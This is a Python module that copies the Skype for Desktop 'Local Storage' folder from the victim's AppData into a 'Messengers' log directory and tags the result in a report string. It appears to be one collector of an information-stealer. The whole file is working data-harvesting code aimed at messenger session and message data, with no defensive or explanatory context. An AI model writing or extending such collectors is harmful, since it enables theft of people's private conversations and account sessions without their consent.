from shutil import copytree
from os import makedirs, environ
from manager.logger import Log
from preferences.config import config

def Skype():
    data = ""
    local = environ["LOCALAPPDATA"]
    pathToLogs = f'{config.pathToLogs}\\Messengers\\Skype'
    path1 = r"\Microsoft\Skype for Desktop\Local Storage"
    try:
        makedirs(pathToLogs, exist_ok=True)
        copytree(rf"{local}{path1}",pathToLogs)
        data += "\n∟📨Skype"
        return data
    except Exception as e:
        Log(f"Skype ---> {e}")
        return data

